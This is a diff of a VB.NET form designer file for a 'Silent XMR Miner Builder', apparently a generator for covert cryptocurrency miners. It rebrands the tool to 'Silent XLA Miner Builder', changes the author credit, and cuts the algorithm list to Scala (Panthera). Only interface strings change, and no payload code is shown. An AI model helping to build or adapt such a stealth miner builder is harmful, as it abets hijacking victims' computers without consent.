@@ -415,7 +415,7 @@ Partial Class Form1
         Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
         Me.MephForm1.Name = "MephForm1"
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
-        Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
+        Me.MephForm1.SubHeader = "By Posthuman, Credit to Unam Sanctam"
         Me.MephForm1.TabIndex = 0
         Me.MephForm1.Text = "Silent XMR Miner Builder 1.5.1"
         '
@@ -505,7 +505,7 @@ Partial Class Form1
         Me.txtAlgorithm.FormattingEnabled = True
         Me.txtAlgorithm.ItemHeight = 16
         Me.txtAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
-        Me.txtAlgorithm.Items.AddRange(New Object() {"Monero (rx/0 - RandomX)", "---------------------", "2ACoin (argon2/chukwa - Argon2id Chukwa)", "ArQmA (rx/arq - RandomARQ)", "Blockcloud (cn-heavy/xhv - CryptoNight-Heavy-Haven)", "Conceal (cn/ccx - CryptoNight-Conceal)", "Dero (astrobwt - AstroBWT)", "Electronero (cn/fast)", "ElectroneroXP (cn/fast)", "Graft (cn/rwz)", "Haven (cn-heavy/xhv - CryptoNight-Heavy-Haven)", "Kevacoin (rx/keva - RandomKEVA)", "Kryptokrona (cn-pico - CryptoNight-Pico)", "Masari (cn/half)", "Monero (rx/0 - RandomX)", "NinjaCoin (argon2/ninja Argon2id NINJA)", "Ravencoin (kawpow - KawPow)", "Safex (rx/sfx - RandomSFX)", "Sumokoin (cn/r - CryptoNightR)", "Talleo (cn-pico/tlo - CryptoNight-Pico)", "Turtlecoin (argon2/chukwav2 - Argon2id Chukwa v2)", "Uplexa (cn/upx2 - CryptoNight-Femto)", "Wownero (rx/wow - RandomWOW)", "(cn/zls)", "(cn/double)", "(cn/2)", "(cn/xao)", "(cn/rto)", "(cn-heavy/tube)", "(cn-heavy/0)", "(cn/1)", "(cn-lite/1)", "(cn-lite/0)", "(cn/0)"})
+        Me.txtAlgorithm.Items.AddRange(New Object() {"Scala (Panthera)"})
         Me.txtAlgorithm.Location = New System.Drawing.Point(90, 156)
         Me.txtAlgorithm.Margin = New System.Windows.Forms.Padding(2)
         Me.txtAlgorithm.Name = "txtAlgorithm"
@@ -1446,7 +1446,7 @@ Partial Class Form1
         Me.Name = "Form1"
         Me.Opacity = 0.95R
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
-        Me.Text = "Silent XMR Miner Builder"
+        Me.Text = "Silent XLA Miner Builder"
         Me.TransparencyKey = System.Drawing.Color.Fuchsia
         Me.MephForm1.ResumeLayout(False)
         Me.MephTabcontrol2.ResumeLayout(False)
